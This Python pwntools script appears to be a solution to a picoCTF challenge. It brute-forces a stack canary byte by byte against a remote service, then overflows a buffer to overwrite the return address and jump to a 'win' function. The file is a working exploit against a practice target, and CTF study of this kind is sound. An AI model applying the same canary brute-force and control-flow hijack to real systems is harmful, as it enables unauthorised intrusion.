from pwn import *

def first_exploit_for_find_canary():
    canary = ""
    for canary_i in range(4):
        for i in range(256):
            # p=process("./vuln")
            p=remote("saturn.picoctf.net", 57889)

            print(p.recvuntil(b'>'))

            input_bytes = 64 + (canary_i + 1)

            print(str(input_bytes).encode())
            p.sendline(str(input_bytes).encode())

            print(p.recvuntil(b'>'))

            payload = b"A" * 64

            # canary
            payload += str(canary).encode()
            payload += p8(i)

            print(payload)    
            p.sendline(payload)

            res = p.recvline()
            #print(res)
            if "Stack" not in str(res):
                canary += chr(i)
                print("yeah .......... " + canary)
                break
    return canary


def final_exploit(canary):
    # p=process("./vuln")
    p=remote("saturn.picoctf.net", 57889)

    print(p.recvuntil(b'>'))

    # input_bytes = 64 + 4
    input_bytes = 84 + 4

    print(str(input_bytes).encode())
    p.sendline(str(input_bytes).encode())

    print(p.recvuntil(b'>'))

    payload = b"A" * 64

    # canary
    payload += str(canary).encode()
    
    # padding
    payload += b"A" * (84 - 64 - 4)
    # jump destination
    # elf = ELF('./vuln')
    # win_addr = elf.symbols['win']
    # payload += p32(win_addr)
    payload += p32(0x08049336)

    print(payload)
    p.sendline(payload)

    print(p.recvall())  
    # p.interactive()


def main():
    canary = first_exploit_for_find_canary()
    print("--------------------------------------------------------------------")
    print("canary value : " + canary)
    final_exploit(canary)

if __name__ == "__main__":
    main()

